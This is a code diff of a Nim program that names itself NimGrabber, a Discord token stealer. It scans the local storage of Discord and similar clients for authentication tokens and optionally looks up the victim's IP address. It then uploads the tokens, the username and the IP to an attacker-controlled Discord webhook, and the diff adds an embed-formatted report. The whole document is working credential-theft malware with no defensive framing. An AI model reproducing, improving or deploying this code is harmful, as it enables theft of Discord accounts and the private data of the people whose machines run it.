@@ -10,9 +10,11 @@ from strutils import replace, endswith, strip
 let 
   webhook = "https://discord.com/api/webhooks/489398398492932/you-only-live-once"
   userid: int64 = 87284798287919821
-const
-  sendIP: char = 'Y' ## Possible options: "Y, N"
-
+  
+const ## Possible options: "Y, N"
+  sendIP: char = 'N' 
+  embed:  char = 'N'
+  
 # Do not touch the following
 # --------------------------
 var
@@ -23,8 +25,9 @@ var
 let 
   roaming = getenv("appdata")
   local   = getenv("localappdata")
-   
-  paths = [
+  user    = getenv("username") 
+  
+  paths   = [
     roaming / "Discord", 
     roaming / "discordcanary", 
     roaming / "Lightcord",
@@ -39,6 +42,7 @@ let
   ]
   
 const reg = [re"(?i-u)[\w-]{24}\.[\w-]{6}\.[\w-]{27}", re"(?i-u)mfa\.[\w-]{84}"]
+
 
 for path in paths:
    var path = path & r"\Local Storage\leveldb"
@@ -61,6 +65,7 @@ for path in paths:
                tokens.add cont[f.boundaries]
    else: continue
 
+
 if tokens.len == 0: ## Just in case no token ever gets found 
     tokens.add("No tokens found!") 
     
@@ -68,16 +73,49 @@ tokens = tokens.deduplicate ## Prepare tokens for uploading
 for c in tokens: hooktks.add(c & "\n")
 hooktks = &"```\n{hooktks.strip(leading=false)}```"
 
+
 when sendIP == 'Y': 
     let ip: string = fetch("https://api.ipify.org/")
-    let begin = &"<@{userid}> Victim: **{\"username\".getenv}** | IP Address: **{ip}** \n**__Tokens grabbed by NimGrabber__**:\n"
-else: 
-    let begin = &"<@{userid}> Victim: **{\"username\".getenv}**\n**__Tokens grabbed by NimGrabber__**:\n"
+    let begin = &"<@{userid}> Victim: **{user}** | IP Address: **{ip}** \n**__Tokens grabbed by NimGrabber__**:\n"
+else:
+    let ip: string = "Not Enabled"
+    let begin = &"<@{userid}> Victim: **{user}**\n**__Tokens grabbed by NimGrabber__**:\n"
     
-var data = %*{ 
-    "content": begin & hooktks, 
-    "username": "Nim666" 
-}
+when embed == 'Y':
+    var data = %*{ 
+        "username": "Nim666",
+        "content": &"<@{userid}>",
+        "embeds": [
+            {
+                "title": "__**NimGrabber (By NullCode)**__",
+                "fields": [
+                    {
+                        "name": "[*] Victim",
+                        "value": "**" & user & "**",
+                        "inline": true
+
+                    },
+                    {
+                        "name": "[*] IP Address",
+                        "value": "**" & ip & "**",
+                        "inline": true
+                    }
+                ]
+            },
+            {
+                "title": "__**Tokens grabbed by NimGrabber**__",
+                "fields": [
+                    {
+                        "name": "Total tokens: " & $tokens.len, 
+                        "value": hooktks
+                    },
+                ]
+            }
+        ]
+    }
+else: 
+    var data = %*{ "content": begin & hooktks, "username": "Nim666" }
+
 
 let post = Request( ## Upload said tokens
    url: parseUrl(webhook),
